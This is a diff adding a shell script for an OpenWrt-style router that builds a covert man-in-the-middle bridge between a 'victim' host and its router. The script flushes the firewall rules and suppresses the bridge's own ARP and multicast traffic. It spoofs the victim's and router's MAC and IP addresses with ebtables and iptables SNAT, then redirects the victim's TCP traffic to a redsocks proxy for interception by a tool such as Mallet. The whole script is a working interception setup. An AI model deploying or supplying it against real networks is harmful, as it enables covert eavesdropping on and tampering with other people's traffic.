@@ -1,0 +1,74 @@
+#!/bin/sh
+
+# opkg list-installed | cut -f1 -d' ' | egrep "^(ebtables|ebtables-utils|kmod-ebtables|kmod-ebtables-ipv4)$" | wc -l
+# opkg list-installed | cut -f1 -d' ' | egrep "^(kmod-br-netfilter)$" | wc -l
+# opkg list-installed | cut -f1 -d' ' | egrep "^(kmod-ipt-raw)$" | wc -l
+# opkg list-installed | cut -f1 -d' ' | egrep "^(ip-full)$" | wc -l
+# opkg list-installed | cut -f1 -d' ' | egrep "^(redsocks)$" | wc -l
+
+victim_mac=${victim_mac:-02:00:00:00:00:01}
+victim_ip=${victim_ip:-192.168.1.2}
+router_mac=${router_mac:-02:00:00:00:00:02}
+router_ip=${router_ip:-192.168.1.1}
+victim_dev=${victim_dev:-eth0.1}
+router_dev=${router_dev:-eth0.2}
+br_dev=${br_dev:-br-mitm}
+
+# make sure iptables is called at various levels
+sysctl -w net.bridge.bridge-nf-call-arptables=1
+sysctl -w net.bridge.bridge-nf-call-ip6tables=1
+sysctl -w net.bridge.bridge-nf-call-iptables=1
+
+# clear existing firewall rules
+ebtables -t filter -F
+iptables -t filter -F
+ebtables -t nat -F
+iptables -t nat -F
+iptables -t mangle -F
+iptables -t raw -F
+
+# Make sure we don't send any packets with our own identity to multicast addresses
+# see https://en.wikipedia.org/wiki/Multicast_address
+ebtables -t filter -A OUTPUT -s 0:1:1:1:1:1 -d ff:ff:ff:ff:ff:ff -j DROP 
+ebtables -t filter -A OUTPUT -s 0:1:1:1:1:1 -d 01:00:5e:00:00:01 -j DROP
+ebtables -t filter -A OUTPUT -s 0:1:1:1:1:1 -d 33:33:00:00:00:01 -j DROP
+
+# Configure the two interfaces of the bridge
+# Make sure they do no generate any of their own ARP traffic
+ifconfig $victim_dev -arp up
+ifconfig $router_dev -arp up
+ifconfig $br_dev 169.254.0.1 netmask 255.255.255.0 -arp up
+ip link set dev $br_dev address 0:1:1:1:1:1 arp off
+
+# Make sure we can reach both our victim and the router
+ip neigh replace $victim_ip lladdr $victim_mac dev $br_dev
+route add $victim_ip dev $br_dev
+ip neigh replace $router_ip lladdr $router_mac dev $br_dev
+route add $router_ip dev $br_dev
+
+# Optional: Allows routing to the rest of the network
+# route add default gw $router_ip
+
+# Any packets sent to anyone other than the victim appear to come from the victim MAC
+ebtables -t nat -A POSTROUTING -s 0:1:1:1:1:1 ! -d $victim_mac -j snat --to-source $victim_mac
+# Any packets to anyone other than the victim appear to come from the victim IP address
+iptables -t nat -A POSTROUTING -p tcp -s 169.254.0.1 ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
+iptables -t nat -A POSTROUTING -p udp -s 169.254.0.1 ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
+iptables -t nat -A POSTROUTING -p icmp -s 169.254.0.1 ! -d $victim_ip -j SNAT --to $victim_ip
+
+# Any packets sent to the victim appear to come from the router MAC
+ebtables -t nat -A POSTROUTING -s 0:1:1:1:1:1 -d $victim_mac -j snat --to-source $router_mac
+# Any packets to the victim appear to come from the router IP address
+iptables -t nat -A POSTROUTING -p tcp -s 169.254.0.1 -d $victim_ip -j SNAT --to $router_ip:27000-32000
+iptables -t nat -A POSTROUTING -p udp -s 169.254.0.1 -d $victim_ip -j SNAT --to $router_ip:27000-32000
+iptables -t nat -A POSTROUTING -p icmp -s 169.254.0.1 -d $victim_ip -j SNAT --to $router_ip
+
+# optional: Direct any traffic from the victim to hit redsocks, for interception by Mallet, etc
+# create a custom chain
+iptables -t nat -N REDSOCKS
+iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345
+
+# Make sure that traffic to or from the victim enters the REDSOCKS chain
+iptables -t nat -I PREROUTING 1 -p tcp -s $victim_ip -j REDSOCKS
+iptables -t nat -I PREROUTING 1 -p tcp -d $victim_ip -j REDSOCKS
+
